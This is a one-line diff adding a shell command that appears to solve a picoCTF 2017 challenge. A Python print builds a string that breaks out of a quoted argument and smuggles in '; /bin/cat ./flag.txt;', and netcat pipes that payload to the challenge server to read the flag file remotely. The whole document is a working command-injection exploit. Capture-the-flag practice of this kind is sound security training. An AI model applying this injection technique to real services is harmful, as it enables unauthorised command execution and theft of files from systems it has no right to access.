@@ -1,0 +1,1 @@
+python -c "print '\" ; /bin/cat ./flag.txt; \"'" | nc shell2017.picoctf.com 51865
